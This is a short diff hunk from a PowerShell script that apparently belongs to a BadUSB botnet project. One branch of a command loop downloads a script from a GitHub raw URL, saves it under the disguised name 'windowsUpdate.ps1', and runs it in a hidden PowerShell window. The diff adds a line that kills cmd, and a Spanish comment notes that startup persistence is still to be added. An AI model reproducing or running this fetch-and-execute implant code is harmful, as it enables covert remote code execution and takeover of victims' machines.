@@ -210,6 +210,7 @@ While ($DoNotExit)  {
 		Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/d6961bac47986b3e047cd9468de4639b9f9a45d0/poc.ps1 -OutFile C:\Users\afranco\Documents\windowsUpdate.ps1
 		$command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\afranco\Documents\windowsUpdate.ps1"
 		Invoke-Expression -Command:$command 
+		Stop-Process -Name "cmd" -Confirm -PassThru
 		# Falta añadirlo al inicio de windows
 	  }
 	  default  {
